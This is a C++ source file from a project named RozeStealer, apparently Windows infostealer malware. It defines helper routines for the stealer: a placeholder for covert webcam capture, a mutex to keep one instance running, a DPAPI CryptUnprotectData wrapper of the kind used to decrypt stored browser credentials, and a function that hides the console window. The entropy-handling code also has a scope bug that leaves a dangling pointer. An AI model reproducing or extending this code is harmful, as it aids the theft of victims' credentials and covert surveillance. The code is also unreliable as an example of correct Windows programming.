
#include "Syscalls.h"
#include <iostream>
#include <vector>
#include <wincrypt.h>

#pragma comment(lib, "crypt32.lib")

namespace RozeStealer {

bool Syscalls::captureWebcam(int index, const std::string& filePath) {
    // This is a complex function that requires the `avicap32.lib` library and specific Windows API calls.
    // A full implementation would involve setting up a capture window, connecting to the camera,
    // and saving the image. For now, this is a placeholder.
    // Example: avicap32.capCreateCaptureWindowW, SendMessageA with WM_CAP_DRIVER_CONNECT, WM_CAP_FILE_SAVEDIB
    std::cout << "Attempting to capture webcam image to: " << filePath << std::endl;
    return false; // Placeholder
}

bool Syscalls::createMutex(const std::string& mutexName) {
    HANDLE hMutex = CreateMutexA(NULL, FALSE, mutexName.c_str());
    if (hMutex == NULL) {
        // Handle error
        return false;
    }
    // If GetLastError returns ERROR_ALREADY_EXISTS, it means the mutex already exists.
    return GetLastError() != ERROR_ALREADY_EXISTS;
}

std::vector<unsigned char> Syscalls::cryptUnprotectData(const std::vector<unsigned char>& encryptedData, const std::string& optionalEntropy) {
    DATA_BLOB inputBlob;
    inputBlob.cbData = static_cast<DWORD>(encryptedData.size());
    inputBlob.pbData = const_cast<BYTE*>(encryptedData.data());

    DATA_BLOB outputBlob;
    DATA_BLOB entropyBlob;

    if (!optionalEntropy.empty()) {
        std::vector<BYTE> entropyBytes(optionalEntropy.begin(), optionalEntropy.end());
        entropyBlob.cbData = static_cast<DWORD>(entropyBytes.size());
        entropyBlob.pbData = entropyBytes.data();
    }

    if (CryptUnprotectData(
        &inputBlob,
        NULL,
        optionalEntropy.empty() ? NULL : &entropyBlob,
        NULL,
        NULL,
        0,
        &outputBlob
    )) {
        std::vector<unsigned char> decryptedData(outputBlob.pbData, outputBlob.pbData + outputBlob.cbData);
        LocalFree(outputBlob.pbData);
        return decryptedData;
    } else {
        // Handle error, e.g., GetLastError()
        return {}; // Return empty vector on failure
    }
}

void Syscalls::hideConsole() {
    HWND consoleWindow = GetConsoleWindow();
    if (consoleWindow) {
        ShowWindow(consoleWindow, SW_HIDE);
    }
}

} // namespace RozeStealer


